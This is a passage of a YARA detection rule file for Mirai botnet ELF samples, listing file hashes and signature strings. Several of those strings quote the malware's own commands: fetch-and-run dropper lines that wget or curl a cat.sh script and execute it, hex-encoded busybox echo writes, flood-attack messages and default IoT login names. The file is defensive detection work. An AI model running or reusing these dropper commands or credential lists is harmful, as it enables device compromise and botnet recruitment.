      hash19 = "2ee9a42c7da356fc65fa94d18094ec12d967536a76a053437870646f3d0667f5"
      hash20 = "2f52dc2e2d937a2cfe6ec241f8c740ee59518cf7accf6a9770efe66b39b408f6"
      hash21 = "3022317d45af94ac80364444d10a207a7b6ade37274f4fe43acd59b2cc4742f8"
      hash22 = "3079034e8abdd76dbe19ad25091eeb670360e092de0bc144f8cf84c145b2fb5a"
      hash23 = "355ff5d3af3cbd4dd678bee4407f826dfde28c431a3f1f66d26bba1a3248cc75"
      hash24 = "35f14e909ac8b7fb6be9d601a56e671160a3fb971435131cf9d183cc1105d67b"
      hash25 = "3654d22ee59848a200428632911d3cbac44dbb68d40bc6660244493ab0cee882"
      hash26 = "36bed4517e8578378cfd5628a11a10458a54424e14567ad74621bef22af72e2b"
      hash27 = "36db9aab7204d1a9d1859f45108614686c5e6021bddcf7a7fa120899d83334a0"
      hash28 = "36dd257bea506555a7a2f5a30228781e4949651e48dfba6c6ea3878ef30ad51b"
      hash29 = "37e39ec80792fb487504db381da4cbebe9737e6cc1ca2af95542483567ed1256"
      hash30 = "3c49de25e5bf45572154d076f86e35b2ecba09f057641d6953302c8c706bf8f3"
      hash31 = "3f5c35bed0e45e231a60c19a44e00dd31b11d987c3a84d4bad4fd0f6736a8b95"
      hash32 = "3f957cc4661386e91ca685f15d7d4ea24965c4f9213cadf822332522816ab613"
      hash33 = "3faf435798bf284f72555578d9c55674772ad2d80ef3ed791ee0f0b3a59a1a1f"
      hash34 = "3fb73ed97b6102825b24e6986148d5c1ab447d681a0bf72c7f4e47f01300932e"
      hash35 = "3fe6d5a305743800da48c182487e142f3927b40b51a3f946a89b98556a526e69"
      hash36 = "4257f0992f19704aa44249881566901db0943a83f90c7ae563777473a7017b25"
      hash37 = "42f0f7da2d29a48c4a49bc12bc716111b7fd200a13c907df8b486e556b7c8fc0"
      hash38 = "435e67c0fcb0ac34b17754527f264833553ada8fa222aa37a0841b3faf6324a5"
      hash39 = "44f5dc9b45f8c14261379de5105cbe76aad1c9074bb239b139b1dfeb8a8b407d"
      hash40 = "45c211c10c29dcda5602ada00279432484c6f2350c68eaad3048fca3ae1032ce"
      hash41 = "4623d2ab08730cf91261c764d26e268d9b1178e9bd78d8b67f2ef284553346e8"
      hash42 = "46f381b3d882cdd0263a8321f0160bf6de07fac1df61482be91ddb8c87e9ddb7"
      hash43 = "488a3964f1e8849bdaff87c32c0f33d785062285b2427e2f2e81f7b35240e0a7"
      hash44 = "4a11799891c39d0a2b8769f38d56ea8a3305997387fe7f1aee4f2c7b9171c190"
      hash45 = "4c2b7fc7a982db5165a95495551b4444938c75ff8c6a986afd781a57e012ed12"
      hash46 = "4ccabe30fdb66f602194145df2a695093bf4cfa44a4903075ae6999e59903922"
      hash47 = "4d8d5b8acc632f220d84bbdb1347a93aab3686377ef306bba67a640be4afb9cd"
      hash48 = "4dcdbd21914f34f1c0b2a323da5a6840e7665ed56dc18b43a1638b721a1c2248"
      hash49 = "51e85925e9c3d37565a4cea9a69c86f039030bf3fcfae8750bb8ea474d9f676f"
      hash50 = "5245c572b41cb1257c070a75fa2fb6625c3d699172f89306aadd2bd32843546d"
      hash51 = "537d2785ff9e7f8c81bdb4cf8ef85bbd2438516712f99c6f66016f7ea179ad4f"
      hash52 = "551cbc1698d7e07b9e00c4443098449f0a5ef09e14e7d861b757e853f77fe671"
      hash53 = "56ca29b158fe145953ba0165b56af3b0e533b8b155581e37174037abea8f3c60"
      hash54 = "572b6ab3c9095f00741c6c2f86f1d477fad4bb568b6cc4ac6ad8d7e42353cbbf"
      hash55 = "5943207f84c98e382df07e85b1f38ef487b78393f9e5ecaef95c385e2b33b830"
      hash56 = "5b18c9cbe6bccec88732d23ce39ba1d863cb8487cb0c557cbbd169b9f61e886f"
      hash57 = "5c9d399baaf6b4020909a3b8c97f61fa09846b9b27fc0882d4c8fa362042385a"
      hash58 = "5ebf996d40df9eec8476554d92ababf00975b620bbd046d09e20bf751a25eb42"
      hash59 = "5f343a4b7136f6e6216c07fa04adf0c2ca168c2142417d6fa3a13c665a110d63"
      hash60 = "61c23c332c5f8e1952f0343471cd43b4b2c3376e591835dcd1c547702dcc8594"
      hash61 = "62098781511c8b01bf052da1151d60b3ce8c42c557591c7a90ba6f7f02f96060"
      hash62 = "6407da1321eb83154352e38a25826d58e1a503da2fb67a201025b60b0957d388"
      hash63 = "6509f8d5312e74b83dcc973477b33d6a439bc050545d2bc54962f9b43d8ddf88"
      hash64 = "654d37fe82ca152c7091f355e1e3171ba4e82a11261e306239cd956d3dc92413"
      hash65 = "66b29d0b0815ec905ebf9d50b9625ca60acaae739b04774c78bc8392982bdaff"
      hash66 = "66c7502ff375bbbfbfb58c22e3cace095173223ae92f24e73371f645595ab17f"
      hash67 = "674e4453352dd7e3f7d47e7a37d4af508dc657343d5fba4c1162c587e5b829d1"
      hash68 = "68b4d415e14684a4894fe7386dd48c2a1e081313f8dfb227bc8e4fad9b2a8f08"
      hash69 = "68f89833bf74c49260c19d9369124cd173373e5e493fae27be88ba788aac8613"
      hash70 = "6b36c9510867769c13bc4d67b7341343a1015de7514dd97083b20a19c3891207"
      hash71 = "6b469574f60e7119dbc3b5a128caa8fbce342534d9f781a7e95cb9fc8c43c8bd"
      hash72 = "6bf02c0a0b01dbbeb4059785dd26ecbb5c34fb48f8855901e06ac94183776505"
      hash73 = "6bfe1ef9772b6e98ce59df39a922e07ec789e8a629f38eed755aaa7e74382802"
      hash74 = "6c7cb03cbd896b51cfe7c3aecba63ab659daaa0fb6e2e05be43f3726aef61d57"
      hash75 = "6c9a81f9274570fe1ea67285664d25a43273707ac4eddbfe979d7af5c2f734a7"
   strings:
      $s1 = "User-Agent: Wget" fullword ascii /* score: '17.00'*/
      $s2 = "xirtam" fullword ascii /* reversed goodware string 'matrix' */ /* score: '15.00'*/
      $s3 = "/bin/busybox echo -ne " fullword ascii /* score: '11.00'*/
      $s4 = "admintelecom" fullword ascii /* score: '11.00'*/
      $s5 = "supportadmin" fullword ascii /* score: '11.00'*/
      $s6 = "solokey" fullword ascii /* score: '11.00'*/
      $s7 = "root621" fullword ascii /* score: '8.00'*/
      $s8 = "tsgoingon" fullword ascii /* score: '8.00'*/
      $s9 = "firetide" fullword ascii /* score: '8.00'*/
      $s10 = "root123" fullword ascii /* score: '8.00'*/
      $s11 = "grouter" fullword ascii /* score: '8.00'*/
      $s12 = "wabjtam" fullword ascii /* score: '8.00'*/
      $s13 = "unisheen" fullword ascii /* score: '8.00'*/
      $s14 = "zhongxing" fullword ascii /* score: '8.00'*/
      $s15 = "telnetadmin" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 1000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__23da5558_Mirai_signature__253adc3b_Mirai_signature__2b37a8e3_Mirai_signature__3063b1a9_Mirai_signature__31_17 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_23da5558.elf, Mirai(signature)_253adc3b.elf, Mirai(signature)_2b37a8e3.elf, Mirai(signature)_3063b1a9.elf, Mirai(signature)_31a18daa.elf, Mirai(signature)_327f7742.elf, Mirai(signature)_355bf0ff.elf, Mirai(signature)_36bb77da.elf, Mirai(signature)_38e02ed8.elf, Mirai(signature)_3aea5a40.elf, Mirai(signature)_3b46c349.elf, Mirai(signature)_3bef84f1.elf, Mirai(signature)_3f6cfadb.elf, Mirai(signature)_44999d62.elf, Mirai(signature)_4da560aa.elf, Mirai(signature)_4ff2888d.elf, Mirai(signature)_5a1d9183.elf, Mirai(signature)_5d9434fc.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "23da555858c0104bd60b3e918efd5d9f362b8cf4c4523224f3f39dd4a47ad2f7"
      hash2 = "253adc3bb48435122f8c3f39580b29c3ad66b88e1ac98e52420abf39bdbbba4e"
      hash3 = "2b37a8e3ec622f8ae9c3ac30aef1dfbb4af56ebe9a66675a0c40a5c61478d995"
      hash4 = "3063b1a98d934b80c77ec0b515220a62eb41af84be1bde5fb2d65757e5f32c6b"
      hash5 = "31a18daa6603dd7005b15fd5cb925d7f7096aab83cf191825b30e58b3cbf8633"
      hash6 = "327f774238181fdd64123535b46bfc91dc7223dddfc0cd9d8bec50a1f5c9616b"
      hash7 = "355bf0ff2d4b5c1344d3e4c4a368d2d64fa95654755de0944496d8b535c6dc4b"
      hash8 = "36bb77da16b12417510a0663735488cf4393e02518bbcf39e05d23c1449ae3ed"
      hash9 = "38e02ed85d0f7629e13f54489a430681477fd9694f35d4e864cf616708261372"
      hash10 = "3aea5a400d17dc668a67377eb012a5db00909644152679f834659dbac35e37f2"
      hash11 = "3b46c349abed5ce9921e875eea04c890d03f1950d653a8a4821aa2a68d8a2970"
      hash12 = "3bef84f1d7f50a9c06d68d1b43c5a124c698a704d89f1c2b050563fa1c119b9d"
      hash13 = "3f6cfadb698f450df2cdf6773d73ebce336eaa21bcd85e5e8271b382ac66841b"
      hash14 = "44999d62550d79ea67ace000bfe5d83cafd6678decb14da5b841db9d33de70e0"
      hash15 = "4da560aad4f0960291ff354fca76f10d16864614d04d8c49863ef5c5a837127b"
      hash16 = "4ff2888d814764a478499fa27ba3831f9ce0395aacdd0da779127d9027a778e1"
      hash17 = "5a1d91831955900ce61ac7df64647bd67396329f246a22e104f9ddd9ecf7dc57"
      hash18 = "5d9434fc00c92e10bcf72fdce59c9546ee52d60df8ac5af9d525f25404576b98"
   strings:
      $s1 = "processCmd" fullword ascii /* score: '18.00'*/
      $s2 = "UserAgents" fullword ascii /* score: '12.00'*/
      $s3 = "httphex" fullword ascii /* score: '11.00'*/
      $s4 = "fdgets" fullword ascii /* score: '10.00'*/
      $s5 = "resolv_domain_to_hostname" fullword ascii /* score: '9.00'*/
      $s6 = "getOurIP" fullword ascii /* score: '9.00'*/
      $s7 = "vseattack" fullword ascii /* score: '8.00'*/
      $s8 = "fdpclose" fullword ascii /* score: '8.00'*/
      $s9 = "makevsepacket" fullword ascii /* score: '8.00'*/
      $s10 = "numpids" fullword ascii /* score: '8.00'*/
      $s11 = "sockprintf" fullword ascii /* score: '8.00'*/
      $s12 = "tcpcsum" fullword ascii /* score: '8.00'*/
      $s13 = "printchar" fullword ascii /* score: '8.00'*/
      $s14 = "zprintf" fullword ascii /* score: '8.00'*/
      $s15 = "fdpopen" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 600KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__238db610_Mirai_signature__283d1563_Mirai_signature__37fee66f_18 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_238db610.elf, Mirai(signature)_283d1563.elf, Mirai(signature)_37fee66f.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "238db610ec64bf66cb4f3fa7b107b38ddfad07858337d06a12eae211ed05a9ce"
      hash2 = "283d1563d6e89e072a423334f0ea6ddd4c38ae6d132db8cb47736dec1665af5d"
      hash3 = "37fee66f985e19a3de014cd65bc2861de4d6a0483ed8c4eea1c3cb25e4ed2631"
   strings:
      $s1 = "[tcpbypass_flood] started: ('%d')" fullword ascii /* score: '23.00'*/
      $s2 = "[udpbypass_flood] started: ('%d')" fullword ascii /* score: '23.00'*/
      $s3 = "[udpbypass_flood] socket() failed" fullword ascii /* score: '23.00'*/
      $s4 = "[syn_flood] started: ('%d')" fullword ascii /* score: '12.00'*/
      $s5 = "[udp_plain_flood] socket() failed" fullword ascii /* score: '12.00'*/
      $s6 = "[syn_flood] setsockopt() failed" fullword ascii /* score: '12.00'*/
      $s7 = "[psh_ack_flood] setsockopt() failed" fullword ascii /* score: '12.00'*/
      $s8 = "[icmp_flood] setsockopt() failed" fullword ascii /* score: '12.00'*/
      $s9 = "[psh_ack_flood] started: ('%d')" fullword ascii /* score: '12.00'*/
      $s10 = "[udp_flood] socket() failed" fullword ascii /* score: '12.00'*/
      $s11 = "[udp_plain_flood] started: ('%d')" fullword ascii /* score: '12.00'*/
      $s12 = "[ack_flood] setsockopt() failed" fullword ascii /* score: '12.00'*/
      $s13 = "[ack_flood] started: ('%d')" fullword ascii /* score: '12.00'*/
      $s14 = "[syn_flood] socket() failed" fullword ascii /* score: '12.00'*/
      $s15 = "[icmp_flood] socket() failed" fullword ascii /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__1d5bb24e_Mirai_signature__20523f26_Mirai_signature__21f9efb9_Mirai_signature__225624e5_Mirai_signature__22_19 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_1d5bb24e.elf, Mirai(signature)_20523f26.elf, Mirai(signature)_21f9efb9.elf, Mirai(signature)_225624e5.elf, Mirai(signature)_22dc51a7.elf, Mirai(signature)_235e1bb9.elf, Mirai(signature)_24872075.elf, Mirai(signature)_2aef512d.elf, Mirai(signature)_2e9e4a16.elf, Mirai(signature)_3079034e.elf, Mirai(signature)_35f14e90.elf, Mirai(signature)_3654d22e.elf, Mirai(signature)_36bed451.elf, Mirai(signature)_3c49de25.elf, Mirai(signature)_3f5c35be.elf, Mirai(signature)_3f957cc4.elf, Mirai(signature)_3fe6d5a3.elf, Mirai(signature)_44f5dc9b.elf, Mirai(signature)_4623d2ab.elf, Mirai(signature)_46f381b3.elf, Mirai(signature)_4c2b7fc7.elf, Mirai(signature)_537d2785.elf, Mirai(signature)_62098781.elf, Mirai(signature)_6509f8d5.elf, Mirai(signature)_66b29d0b.elf, Mirai(signature)_66c7502f.elf, Mirai(signature)_68b4d415.elf, Mirai(signature)_6b36c951.elf, Mirai(signature)_6c7cb03c.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "1d5bb24e8127095d5e0a337be1a25339a75c4f2bd3522de8797549ed0710162e"
      hash2 = "20523f266eee48ad6ac594280472c4c558ff62c513e4422e27e81addc750be3c"
      hash3 = "21f9efb992b4e1d1beaf3b3a479153277e86fdc1c00c2728a5fb4e212a2a4554"
      hash4 = "225624e52e0590cf79aa5a5daefb05011402d3ce80a6701107ff5175f5c7f7db"
      hash5 = "22dc51a72f5b30374a702a81c45af898ecabcf1e0ea28c46ff9e10533a6e071b"
      hash6 = "235e1bb98f0f295983321c223d4499bff7897f881b96920715868aed191f24f4"
      hash7 = "24872075ae9bbeed2ca56621780ac2dc6ff507e54126aeca86802681e339a8a7"
      hash8 = "2aef512df33be0b36a71e753fc6884bded09c40af4c2b6383737faed7911bc53"
      hash9 = "2e9e4a16603654d6da46bd1a4884fae72a5817fb772007a5e822cc5d63c43eb0"
      hash10 = "3079034e8abdd76dbe19ad25091eeb670360e092de0bc144f8cf84c145b2fb5a"
      hash11 = "35f14e909ac8b7fb6be9d601a56e671160a3fb971435131cf9d183cc1105d67b"
      hash12 = "3654d22ee59848a200428632911d3cbac44dbb68d40bc6660244493ab0cee882"
      hash13 = "36bed4517e8578378cfd5628a11a10458a54424e14567ad74621bef22af72e2b"
      hash14 = "3c49de25e5bf45572154d076f86e35b2ecba09f057641d6953302c8c706bf8f3"
      hash15 = "3f5c35bed0e45e231a60c19a44e00dd31b11d987c3a84d4bad4fd0f6736a8b95"
      hash16 = "3f957cc4661386e91ca685f15d7d4ea24965c4f9213cadf822332522816ab613"
      hash17 = "3fe6d5a305743800da48c182487e142f3927b40b51a3f946a89b98556a526e69"
      hash18 = "44f5dc9b45f8c14261379de5105cbe76aad1c9074bb239b139b1dfeb8a8b407d"
      hash19 = "4623d2ab08730cf91261c764d26e268d9b1178e9bd78d8b67f2ef284553346e8"
      hash20 = "46f381b3d882cdd0263a8321f0160bf6de07fac1df61482be91ddb8c87e9ddb7"
      hash21 = "4c2b7fc7a982db5165a95495551b4444938c75ff8c6a986afd781a57e012ed12"
      hash22 = "537d2785ff9e7f8c81bdb4cf8ef85bbd2438516712f99c6f66016f7ea179ad4f"
      hash23 = "62098781511c8b01bf052da1151d60b3ce8c42c557591c7a90ba6f7f02f96060"
      hash24 = "6509f8d5312e74b83dcc973477b33d6a439bc050545d2bc54962f9b43d8ddf88"
      hash25 = "66b29d0b0815ec905ebf9d50b9625ca60acaae739b04774c78bc8392982bdaff"
      hash26 = "66c7502ff375bbbfbfb58c22e3cace095173223ae92f24e73371f645595ab17f"
      hash27 = "68b4d415e14684a4894fe7386dd48c2a1e081313f8dfb227bc8e4fad9b2a8f08"
      hash28 = "6b36c9510867769c13bc4d67b7341343a1015de7514dd97083b20a19c3891207"
      hash29 = "6c7cb03cbd896b51cfe7c3aecba63ab659daaa0fb6e2e05be43f3726aef61d57"
   strings:
      $s1 = "/t/wget.sh -O- | sh;curl http://" fullword ascii /* score: '20.00'*/
      $s2 = "/bin/busybox wget http://" fullword ascii /* score: '15.00'*/
      $s3 = "/t/curl.sh -o- | sh" fullword ascii /* score: '12.00'*/
      $s4 = "/bin/busybox echo -ne \"\\x20\\x2F\\x70\\x72\\x6F\\x63\\x2F\\x24\\x70\\x69\\x64\\x2F\\x63\\x6D\\x64\\x6C\\x69\\x6E\\x65\\x20\\x3" ascii /* score: '11.00'*/
      $s5 = "useradmin" fullword ascii /* score: '11.00'*/
      $s6 = "/bin/busybox echo -ne \"\\x71\\x20\\x22\\x24\\x70\\x69\\x64\\x22\\x20\\x5D\\x20\\x32\\x3E\\x20\\x2F\\x64\\x65\\x76\\x2F\\x6E\\x7" ascii /* score: '11.00'*/
      $s7 = "/bin/busybox echo -ne \"\\x20\\x74\\x68\\x65\\x20\\x70\\x72\\x6F\\x63\\x65\\x73\\x73\\x0A\\x20\\x20\\x63\\x6D\\x64\\x6C\\x69\\x6" ascii /* score: '11.00'*/
      $s8 = "/bin/busybox echo -ne \"\\x76\\x72\\x48\\x65\\x6C\\x70\\x65\\x72\\x22\\x0A\\x20\\x20\\x69\\x66\\x20\\x65\\x63\\x68\\x6F\\x20\\x2" ascii /* score: '11.00'*/
      $s9 = "/bin/busybox rm -rf .ntpf .k" fullword ascii /* score: '11.00'*/
      $s10 = "/bin/busybox echo -ne \"\\x6E\\x75\\x6D\\x65\\x72\\x69\\x63\\x20\\x64\\x69\\x72\\x65\\x63\\x74\\x6F\\x72\\x69\\x65\\x73\\x0A\\x2" ascii /* score: '11.00'*/
      $s11 = "/bin/busybox echo -ne \"\\x20\\x43\\x68\\x65\\x63\\x6B\\x20\\x69\\x66\\x20\\x74\\x68\\x65\\x20\\x63\\x6F\\x6D\\x6D\\x61\\x6E\\x6" ascii /* score: '11.00'*/
      $s12 = "/bin/busybox echo -ne \"\\x76\\x72\\x48\\x65\\x6C\\x70\\x65\\x72\\x22\\x0A\\x20\\x20\\x69\\x66\\x20\\x65\\x63\\x68\\x6F\\x20\\x2" ascii /* score: '11.00'*/
      $s13 = "/bin/busybox echo -ne \"\\x20\\x74\\x68\\x65\\x20\\x70\\x72\\x6F\\x63\\x65\\x73\\x73\\x0A\\x20\\x20\\x63\\x6D\\x64\\x6C\\x69\\x6" ascii /* score: '11.00'*/
      $s14 = "/bin/busybox echo -ne \"\\x69\\x6E\\x75\\x65\\x0A\\x20\\x20\\x66\\x69\\x0A\\x0A\\x20\\x20\\x23\\x20\\x47\\x65\\x74\\x20\\x74\\x6" ascii /* score: '11.00'*/
      $s15 = "/bin/busybox echo -ne \"\\x20\\x2F\\x70\\x72\\x6F\\x63\\x2F\\x24\\x70\\x69\\x64\\x2F\\x63\\x6D\\x64\\x6C\\x69\\x6E\\x65\\x20\\x3" ascii /* score: '11.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 600KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__205ba610_Mirai_signature__2b0d719f_Mirai_signature__310f1c6e_Mirai_signature__46c18146_Mirai_signature__4f_20 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_205ba610.elf, Mirai(signature)_2b0d719f.elf, Mirai(signature)_310f1c6e.elf, Mirai(signature)_46c18146.elf, Mirai(signature)_4f248a58.elf, Mirai(signature)_5048384c.elf, Mirai(signature)_551cc47e.elf, Mirai(signature)_68d84848.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "205ba61018cf49c6ff5df49abfcadbe33a38e830fa4f8f657ffa6e2db230ebde"
      hash2 = "2b0d719f5dc2684cb734a73e40c1d03a6ee40f408ac15bef289d7e4d9d73f7e8"
      hash3 = "310f1c6e525d19af148754454e5c6808371fb024ad6f52622c2c044530b4deb0"
      hash4 = "46c181467de432471fa4470564e669ad6bff30b0066720d56552bf6bfbf3b8cd"
      hash5 = "4f248a582a083d8d67d18ae8c2acaa4cfc88b00d882c4f6ba256148b5db96b73"
      hash6 = "5048384c6a681d9b5df1dfce60ef133a9c0c6a3331db8389a56dcd1a51fb9b08"
      hash7 = "551cc47e8a99c0a26e471f433dc186fa24a8381745007255e351ec7b136ed494"
      hash8 = "68d848489d2ba487699cbeffdcd31fb39d22ccb94ab1a2c2983e9538ea551f39"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://%s/cat.sh; curl -O http://%s/cat.sh; chmod 777 cat.sh; sh cat" ascii /* score: '29.00'*/
      $s2 = "command=login&username=%s&password=%s" fullword ascii /* score: '26.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://%s/cat.sh; curl -O http://%s/cat.sh; chmod 777 cat.sh; sh cat" ascii /* score: '24.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root/ wget http://%s/cat.sh; curl -O http://%s/cat.sh; chmod 777 cat.sh; sh cat.sh; " fullword ascii /* score: '24.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root wget http://%s/cat.sh; curl -O http://%s/cat.sh; chmod 777 cat.sh; sh cat.sh; " fullword ascii /* score: '24.00'*/
      $s6 = "Host: %s:554" fullword ascii /* score: '14.50'*/
      $s7 = "/usr/sbin/agetty" fullword ascii /* score: '12.00'*/
      $s8 = "/usr/sbin/klogd" fullword ascii /* score: '12.00'*/
      $s9 = "!openshell %d %8s" fullword ascii /* score: '12.00'*/
      $s10 = "/usr/sbin/syslogd" fullword ascii /* score: '12.00'*/
      $s11 = "/sbin/.sysd" fullword ascii /* score: '11.00'*/
      $s12 = "kthreadd" fullword ascii /* score: '11.00'*/
      $s13 = "ksoftirqd" fullword ascii /* score: '8.00'*/
      $s14 = "/usr/bin/.sysd" fullword ascii /* score: '8.00'*/
      $s15 = "realtek" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__1f9f10b2_Mirai_signature__22ee9306_Mirai_signature__23221097_Mirai_signature__2597c95a_Mirai_signature__25_21 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_1f9f10b2.elf, Mirai(signature)_22ee9306.elf, Mirai(signature)_23221097.elf, Mirai(signature)_2597c95a.elf, Mirai(signature)_25ea89fb.elf, Mirai(signature)_2841d8dd.elf, Mirai(signature)_2862d90e.elf, Mirai(signature)_28a9b4b2.elf, Mirai(signature)_29381f34.elf, Mirai(signature)_2c659376.elf, Mirai(signature)_307bd661.elf, Mirai(signature)_32d84ec7.elf, Mirai(signature)_33a96072.elf, Mirai(signature)_33b8ae25.elf, Mirai(signature)_352800a6.elf, Mirai(signature)_35a9f749.elf, Mirai(signature)_36138be0.elf, Mirai(signature)_375962c5.elf, Mirai(signature)_376dbcd5.elf, Mirai(signature)_3807a288.elf, Mirai(signature)_3925be6e.elf, Mirai(signature)_3972f47c.elf, Mirai(signature)_3b397447.elf, Mirai(signature)_3be62d68.elf, Mirai(signature)_3c338ab0.elf, Mirai(signature)_3c7ebe3c.elf, Mirai(signature)_3d7530b2.elf, Mirai(signature)_3f06657d.elf, Mirai(signature)_3f62195c.elf, Mirai(signature)_40c45993.elf, Mirai(signature)_4238ce2f.elf, Mirai(signature)_424562b2.elf, Mirai(signature)_453812f9.elf, Mirai(signature)_45ef79a2.elf, Mirai(signature)_485d6451.elf, Mirai(signature)_48d4ab62.elf, Mirai(signature)_497371c9.elf, Mirai(signature)_4b7b9cf3.elf, Mirai(signature)_4ccd3724.elf, Mirai(signature)_50d177bd.elf, Mirai(signature)_535f82f6.elf, Mirai(signature)_55851feb.elf, Mirai(signature)_56f04b6a.elf, Mirai(signature)_58a4441b.elf, Mirai(signature)_5931c9a2.elf, Mirai(signature)_5e4c9376.elf, Mirai(signature)_6054a337.elf, Mirai(signature)_61d70735.elf, Mirai(signature)_6424bb7a.elf, Mirai(signature)_651779aa.elf, Mirai(signature)_654826d8.elf, Mirai(signature)_6604b582.elf, Mirai(signature)_67036276.elf, Mirai(signature)_69a44dc7.elf, Mirai(signature)_6bfb2a7b.elf, Mirai(signature)_6c7d17e7.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "1f9f10b2927fc7ea44d21b13644ef38639978f1269cb48e55ec00aab69ef2736"
      hash2 = "22ee9306a773fea4515508caa04473d7147cdada41a5f55c1bc5e4c9dc842227"
      hash3 = "23221097a774856da567c9d4c371d86f4e4f84cb3bc8846008341b778d33f306"
      hash4 = "2597c95a8f9085a94fbcd4ae7470ed79812ec4abeb208350710701870770fe2b"
      hash5 = "25ea89fb1b30e27092b7d75d8f593ddcc2851d17bb569505e993b6e7bca75182"
      hash6 = "2841d8ddd441e5575b3ba86995f2272bbc9cdcbc95fbc56d7fecc2215147b6e1"
      hash7 = "2862d90e7dcadfd70ac0fd786414cc8424354883a821f426a15995a0b9d727c6"
      hash8 = "28a9b4b286ab25170ed4bd6008aa01df4c2d0f04b8b68c1523e1269737a92108"
      hash9 = "29381f34ea6ac17ab22423f0665f818e3f18320a57d28b994464a5e19de1d717"
      hash10 = "2c6593762fb1c9303ae7b346cfe0b9b2a49926d9e4a8fcec3193935d8a3f5a0f"
      hash11 = "307bd661e890535ff5bf14aa7f17128d7feb1006a04bb26965b034d5fe214ca3"
      hash12 = "32d84ec7a5f4c8c081fac153b98d3ad0855360e17b1ee505bc431544f71f2f65"
      hash13 = "33a960729b9805f72b3a7dd14fd123f6f71863d16c8b933ebcff1efbcdc685a5"
      hash14 = "33b8ae256391ee27d1e0b2fd3adf61598d98f8e53918f777169b828bbfccbbfb"
      hash15 = "352800a63dc4ff68272c041ea4c6026ff8c01f2b1591d118a9d54c91213e2fed"
      hash16 = "35a9f749dc6c8d4347adae5c8161277691050c7c9db85c9852bd21945bf53ee9"
      hash17 = "36138be064c2ad56445d84f82d31a5bedac0f6301e0231be49ebeda59cbdc9d9"
      hash18 = "375962c5f822703ac53f42e26b684dfc8db10c49abbfd08ef38ce7be097f9a35"
      hash19 = "376dbcd54bd7877002637fe2a091fe6320d715a4c0b932e73420662aaf1356ad"
      hash20 = "3807a288db8989920d148451c3835f0b7575c901dff9bd5fa9fd0ba96c26356c"
      hash21 = "3925be6e76a13bc16e8b3793bb72e8dccb6942ad0473eda1da310775ddc22119"
      hash22 = "3972f47ccd7ece29b73fb2b51f7949efbaa350bee28295b283cc49f1812cdafe"
      hash23 = "3b397447fafcfb6765017f1c7818f1ce8dcf64d63c4eb0dea04a836edb539c2b"
      hash24 = "3be62d68457387363efdf7af26ba9bc30427ff95d7fe8a72c477bf669ed2c88a"
      hash25 = "3c338ab029f7d1b3ca70ec0e0d77cea04b7ab3af82ee9404c60ae41eb95cc7cf"
      hash26 = "3c7ebe3cfe5d0f1193a382c53aa8c3aaf964e5853b6ec1921aea3afa52fc7fb9"
      hash27 = "3d7530b2277449d52dcdac5f911ce7f4566bad04614fa1d65ae873024fdbecb5"
      hash28 = "3f06657d12f2b75792dfbdd97769fda9041630f97b1250978b96e76867f45442"
      hash29 = "3f62195c8b20a04fe4d7d9e95ae363a33ad3aace26edaf5917d48c3a46e3fb4d"
      hash30 = "40c4599334b0a9b83e2e1e39d620fed0d0d39cd2cf2b49e78d75591eada74633"
      hash31 = "4238ce2f7725cd3b8cc24c971f3ace2665c8d55ec00e496f4b1796ac393fc64b"
      hash32 = "424562b2dbc7f718054e75e7e3663c0451b404d546dc759b2a93f4bff35f3ceb"
      hash33 = "453812f9ec23c1df6e78226f471673cf10358e475af0975ca08c87f442af2578"
      hash34 = "45ef79a2b25c5c2c0d4cb32fa58cc35d35f05f7f6d0106114653b7e52ba68005"
      hash35 = "485d6451a00c6c72a0b5f357b75f14ce846a9ae8ca3f3978069d7b8831ff4d87"
      hash36 = "48d4ab62718334ed89761c20287161a165671724c67a066d52712f291d9ebd50"
      hash37 = "497371c90b617e3735b8c6bb8b616dcc01210c103add22c31da827d1b03efc94"
      hash38 = "4b7b9cf380c83861c71a9ac449dc57743d438adcd7d939acc53e0b890cddad63"
      hash39 = "4ccd37241e4301b2c05dfbe0a4b8683edcc3b86d1d5c116b05493fea3d3e09f0"
      hash40 = "50d177bda99132b588d0a2a68179780bf445216229d226577775c31789bd748b"
      hash41 = "535f82f626880949e6d84c365436fd441665d6085d6c87e3bfb103d38ad381d8"
      hash42 = "55851febf771dbddd9bd0c9cd72fdb76a66e3aefc73a1bb7598cd69c8964c746"
      hash43 = "56f04b6a7987032d21da319edbb0f2abe30f83c3e67baf3e8e4c17f41c45a6be"
      hash44 = "58a4441b65d6f3a28eb64dbabdfe667e0e6f3101f6efb855b5f488002929dc82"
      hash45 = "5931c9a2ffe1a8fb7acf99f1f9e32ed6c96d937fd3ef8ba837f4f3996adfa58c"
      hash46 = "5e4c93769059edf9e79fe41fb51fb33cc73ba9ec52ff7d470c5755fb819b5278"
      hash47 = "6054a3372689b61538628ef382792d6e7a4a34951e8bde1de6f04215a16109c1"
      hash48 = "61d7073593cab5fa679a8f232057534fb9950d7342e5fd9f1ae2bc66e02b33a4"
